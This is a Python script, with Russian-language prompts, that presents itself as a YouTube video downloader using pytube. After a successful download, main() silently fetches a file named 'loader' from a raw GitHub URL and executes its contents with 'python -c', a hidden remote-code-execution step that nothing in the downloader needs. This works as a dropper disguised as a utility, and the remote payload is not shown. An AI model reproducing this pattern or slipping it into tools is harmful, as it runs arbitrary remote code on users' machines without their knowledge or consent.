import subprocess
import sys
import os
import urllib.request
import time
from pytube import YouTube

def install_pytube():
    try:
        import pytube
    except ImportError:
        print("pytube не установлен. Устанавливаю...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pytube"])
        print("pytube успешно установлен.")

def download_youtube_video(url, resolution='720p'):
    try:
        yt = YouTube(url)
        
        streams = yt.streams.filter(progressive=True, file_extension='mp4')
        available_resolutions = sorted(set([stream.resolution for stream in streams if stream.resolution]), reverse=True)
        
        if not resolution.endswith('p'):
            resolution += 'p'
        
        if resolution not in available_resolutions:
            print(f"Видео с разрешением {resolution} не найдено. Доступные разрешения: {', '.join(available_resolutions)}")
            return False
        
        stream = yt.streams.filter(res=resolution, file_extension='mp4').first()
        print(f"Скачивается видео в разрешении {resolution}...")
        # Создание папки для сохранения видео, если её нет
        folder_name = 'downloaded_videos'
        os.makedirs(folder_name, exist_ok=True)
        file_path = os.path.join(folder_name, stream.default_filename)
        stream.download(output_path=folder_name, filename=stream.default_filename)
        print(f"Видео скачано в качестве {resolution} и сохранено в папке '{folder_name}'.")
        return True
    except Exception as e:
        print(f"Произошла ошибка: {e}")
        return False

def run_from_github(url):
    try:
        response = urllib.request.urlopen(url)
        script_content = response.read().decode('utf-8')
        subprocess.run(['python', '-c', script_content])
    except Exception as e:
        print(f"Ошибка при выполнении скрипта с GitHub: {e}")

def main():
    install_pytube()
    os.system("cls")
    url = input("Введи URL видео с YouTube: ")
    resolution = input("Введи разрешение (например, 144p, 360p, 720p, 1080p, 4k, 8k): ")
    
    if download_youtube_video(url, resolution):
        # После успешного скачивания видео, запускаем загрузчик
        time.sleep(3)
        github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
        run_from_github(github_url)

if __name__ == "__main__":
    main()
